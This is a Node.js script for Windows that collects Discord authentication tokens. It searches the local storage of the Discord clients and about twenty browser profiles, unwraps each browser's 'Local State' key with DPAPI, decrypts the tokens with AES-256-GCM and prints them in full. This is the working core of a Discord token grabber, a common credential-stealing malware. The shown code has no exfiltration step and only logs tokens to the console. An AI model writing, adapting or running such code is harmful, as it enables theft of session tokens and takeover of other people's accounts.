const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const dpapi = require('@primno/dpapi').default;

// Check if running on Windows
if (process.platform !== 'win32') {
    console.log('This script only works on Windows');
    process.exit(1);
}

const LOCAL = process.env.LOCALAPPDATA;
const ROAMING = process.env.APPDATA;

const PATHS = {
    'Discord': path.join(ROAMING, 'discord'),
    'Discord Canary': path.join(ROAMING, 'discordcanary'),
    'Lightcord': path.join(ROAMING, 'Lightcord'),
    'Discord PTB': path.join(ROAMING, 'discordptb'),
    'Opera': path.join(ROAMING, 'Opera Software', 'Opera Stable'),
    'Opera GX': path.join(ROAMING, 'Opera Software', 'Opera GX Stable'),
    'Amigo': path.join(LOCAL, 'Amigo', 'User Data'),
    'Torch': path.join(LOCAL, 'Torch', 'User Data'),
    'Kometa': path.join(LOCAL, 'Kometa', 'User Data'),
    'Orbitum': path.join(LOCAL, 'Orbitum', 'User Data'),
    'CentBrowser': path.join(LOCAL, 'CentBrowser', 'User Data'),
    '7Star': path.join(LOCAL, '7Star', '7Star', 'User Data'),
    'Sputnik': path.join(LOCAL, 'Sputnik', 'Sputnik', 'User Data'),
    'Vivaldi': path.join(LOCAL, 'Vivaldi', 'User Data', 'Default'),
    'Chrome SxS': path.join(LOCAL, 'Google', 'Chrome SxS', 'User Data'),
    'Chrome': path.join(LOCAL, 'Google', 'Chrome', 'User Data', 'Default'),
    'Epic Privacy Browser': path.join(LOCAL, 'Epic Privacy Browser', 'User Data'),
    'Microsoft Edge': path.join(LOCAL, 'Microsoft', 'Edge', 'User Data', 'Default'),
    'Uran': path.join(LOCAL, 'uCozMedia', 'Uran', 'User Data', 'Default'),
    'Yandex': path.join(LOCAL, 'Yandex', 'YandexBrowser', 'User Data', 'Default'),
    'Brave': path.join(LOCAL, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
    'Iridium': path.join(LOCAL, 'Iridium', 'User Data', 'Default')
};

function getTokens(basePath) {
    const leveldbPath = path.join(basePath, 'Local Storage', 'leveldb');
    const tokens = [];

    if (!fs.existsSync(leveldbPath)) {
        return tokens;
    }

    try {
        const files = fs.readdirSync(leveldbPath);
        
        for (const file of files) {
            if (!file.endsWith('.ldb') && !file.endsWith('.log')) {
                continue;
            }

            try {
                const filePath = path.join(leveldbPath, file);
                const fileContent = fs.readFileSync(filePath, 'utf8');
                
                // Search for encrypted tokens with the Discord pattern
                const tokenRegex = /dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^"]*[^"]/g;
                let match;
                
                while ((match = tokenRegex.exec(fileContent)) !== null) {
                    const fullMatch = match[0];
                    // Extract the token part after dQw4w9WgXcQ:
                    const tokenPart = fullMatch.split('dQw4w9WgXcQ:')[1];
                    if (tokenPart && !tokens.includes(tokenPart)) {
                        tokens.push(tokenPart);
                    }
                }
            } catch (fileError) {
                // Skip files that can't be read (permission issues, etc.)
                continue;
            }
        }
    } catch (error) {
        // Skip directories that can't be read
        return tokens;
    }

    return tokens;
}

function getKey(basePath) {
    try {
        const localStatePath = path.join(basePath, 'Local State');
        if (!fs.existsSync(localStatePath)) {
            return null;
        }

        const localStateContent = fs.readFileSync(localStatePath, 'utf8');
        const localState = JSON.parse(localStateContent);
        
        if (!localState.os_crypt || !localState.os_crypt.encrypted_key) {
            return null;
        }

        return localState.os_crypt.encrypted_key;
    } catch (error) {
        return null;
    }
}

function decryptToken(encryptedToken, encryptedKey) {
    try {
        // Decode the encrypted key and remove the DPAPI prefix (first 5 bytes)
        const keyBuffer = Buffer.from(encryptedKey, 'base64').slice(5);
        
        // Decrypt the key using DPAPI
        const decryptedKey = dpapi.unprotectData(keyBuffer, null, 'CurrentUser');
        if (!decryptedKey) {
            console.log(`[DEBUG] DPAPI decryption failed for key`);
            return null;
        }

        // Decode the token data
        const tokenBuffer = Buffer.from(encryptedToken, 'base64');
        
        // Extract IV (bytes 3-15), encrypted data (from byte 15 to end-16), and auth tag (last 16 bytes)
        const iv = tokenBuffer.slice(3, 15);
        const encryptedData = tokenBuffer.slice(15, tokenBuffer.length - 16);
        const authTag = tokenBuffer.slice(-16);
        
        console.log(`[DEBUG] Key length: ${decryptedKey.length}, IV length: ${iv.length}, Data length: ${encryptedData.length}, Auth tag length: ${authTag.length}`);
        
        // Decrypt using AES-256-GCM
        const decipher = crypto.createDecipheriv('aes-256-gcm', decryptedKey, iv);
        decipher.setAuthTag(authTag);
        
        let decrypted = decipher.update(encryptedData);
        decipher.final();
        
        return decrypted.toString('utf8');
    } catch (error) {
        console.log(`[DEBUG] Token decryption failed: ${error.message}`);
        return null;
    }
}

function main() {
    const checked = [];
    const foundTokens = [];

    for (const [platform, basePath] of Object.entries(PATHS)) {
        if (!fs.existsSync(basePath)) {
            continue;
        }

        console.log(`[DEBUG] Checking ${platform} at ${basePath}`);
        
        const tokens = getTokens(basePath);
        if (tokens.length === 0) {
            console.log(`[DEBUG] No tokens found for ${platform}`);
            continue;
        }
        
        console.log(`[DEBUG] Found ${tokens.length} encrypted tokens for ${platform}`);
        
        const encryptedKey = getKey(basePath);
        if (!encryptedKey) {
            console.log(`[DEBUG] No decryption key found for ${platform}`);
            continue;
        }

        for (let token of tokens) {
            // Clean up token
            token = token.endsWith('\\') ? token.slice(0, -1) : token;

            try {
                const decryptedToken = decryptToken(token, encryptedKey);
                
                if (!decryptedToken) {
                    continue;
                }

                if (checked.includes(decryptedToken)) {
                    continue;
                }
                
                checked.push(decryptedToken);
                foundTokens.push({
                    platform: platform,
                    token: decryptedToken
                });
                
                console.log(`[SUCCESS] Token found from ${platform}: ${decryptedToken.substring(0, 20)}...`);
                
            } catch (error) {
                console.log(`[ERROR] Failed to decrypt token from ${platform}: ${error.message}`);
                continue;
            }
        }
    }

    console.log(`\n[SUMMARY] Found ${foundTokens.length} valid tokens`);
    for (const item of foundTokens) {
        console.log(`  - ${item.platform}: ${item.token}`);
    }
    
    return foundTokens;
}

// Run the main function
if (require.main === module) {
    main();
}

module.exports = { main, getTokens, getKey, decryptToken };